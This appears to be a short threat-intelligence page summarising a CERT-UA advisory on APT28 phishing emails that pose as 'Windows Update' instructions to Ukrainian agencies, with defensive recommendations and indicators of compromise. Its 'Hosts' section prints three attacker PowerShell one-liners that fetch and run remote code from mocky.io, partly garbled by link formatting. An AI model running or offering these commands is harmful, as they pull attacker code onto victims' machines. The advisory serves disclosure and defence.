---
description: '2023-04-30'
---

# CERT-UA About APT28 & Powershell phishing

General Information

The Government Computer Emergency Response Team of Ukraine (CERT-UA) has observed cases of email distribution among Ukrainian government agencies with the subject "Windows Update" during April 2023. These emails are purportedly sent on behalf of department system administrators. The sender email addresses, created on the public service "@outlook.com," may be formed using the real surname and initials of an employee.

A typical email contains instructions in Ukrainian regarding "updates for protection against hacker attacks" and graphical representations of the command line execution and PowerShell command.

The mentioned group will download a PowerShell script that, simulating the operating system update process, ensures the download and execution of the following PowerShell script designed to gather basic computer information using "tasklist" and "systeminfo" commands and send the obtained results via an HTTP request to the Mocky service API.

It is recommended to restrict the ability of users to execute PowerShell and monitor network connections to the Mocky service API.

The activity is carried out by the APT28 group.

Cyber Threat Indicators

Hosts:

powershell $update='windows';$url='[https://www.catalog.update.microsoft.com/scopedviewinline.aspx?updateid=a4b6625c-226e-4dbc-baec-1dbd854b8015';$command='run';$version='v3';$updateid='1e88179a-3105-4a5c-9eb3-aebea36e9c21';$scheme='http://';$url=$scheme+$command+'.mocky\[.\]io/'+$version+'/'+$updateid;$r=(new-object](https://www.catalog.update.microsoft.com/scopedviewinline.aspx?updateid=a4b6625c-226e-4dbc-baec-1dbd854b8015%27;$command=%27run%27;$version=%27v3%27;$updateid=%271e88179a-3105-4a5c-9eb3-aebea36e9c21%27;$scheme=%27http://%27;$url=$scheme+$command+%27.mocky%5B.%5Dio/%27+$version+%27/%27+$updateid;$r=\(new-object) system.net.webclient).downloadstring($url);powershell $r;\&exit powershell $update='windows';$url='[https://www.catalog.update.microsoft.com/scopedviewinline.aspx?updateid=a4b6625c-226e-4dbc-baec-1dbd854b8015';$command='run';$version='v3';$updateid='3b44f33d-b6e5-4ec6-b120-99b6ac52f74b';$scheme='http://';$url=$scheme+$command+'.mocky\[.\]io/'+$version+'/'+$updateid;$r=(new-object](https://www.catalog.update.microsoft.com/scopedviewinline.aspx?updateid=a4b6625c-226e-4dbc-baec-1dbd854b8015%27;$command=%27run%27;$version=%27v3%27;$updateid=%273b44f33d-b6e5-4ec6-b120-99b6ac52f74b%27;$scheme=%27http://%27;$url=$scheme+$command+%27.mocky%5B.%5Dio/%27+$version+%27/%27+$updateid;$r=\(new-object) system.net.webclient).downloadstring($url);powershell $r;\&exit powershell $update='windows';$url='[https://www.catalog.update.microsoft.com/scopedviewinline.aspx?updateid=a4b6625c-226e-4dbc-baec-1dbd854b8015';$command='run';$version='v3';$updateid='ef206b51-4cf4-4c93-90bf-1e66673315b0';$scheme='http://';$url=$scheme+$command+'.mocky\[.\]io/'+$version+'/'+$updateid;$r=(new-object](https://www.catalog.update.microsoft.com/scopedviewinline.aspx?updateid=a4b6625c-226e-4dbc-baec-1dbd854b8015%27;$command=%27run%27;$version=%27v3%27;$updateid=%27ef206b51-4cf4-4c93-90bf-1e66673315b0%27;$scheme=%27http://%27;$url=$scheme+$command+%27.mocky%5B.%5Dio/%27+$version+%27/%27+$updateid;$r=\(new-object) system.net.webclient).downloadstring($url);powershell$r;\&exit

Network:

146\[.]70.105.61 (@m247.ro) 77\[.]75.78.125 (Received) hXXp://mockbin\[.]org/bin/4aa17a07-7635-4ee0-9f3a-449fcd91f342 hXXp://mockbin\[.]org/bin/e8bfd045-2b14-4afc-9372-b723f7d76918 hXXp://mockbin\[.]org/bin/b8427b58-7497-46cd-a5b2-6ff6a40b4592 hXXp://run.mocky\[.]io/v3/1e88179a-310
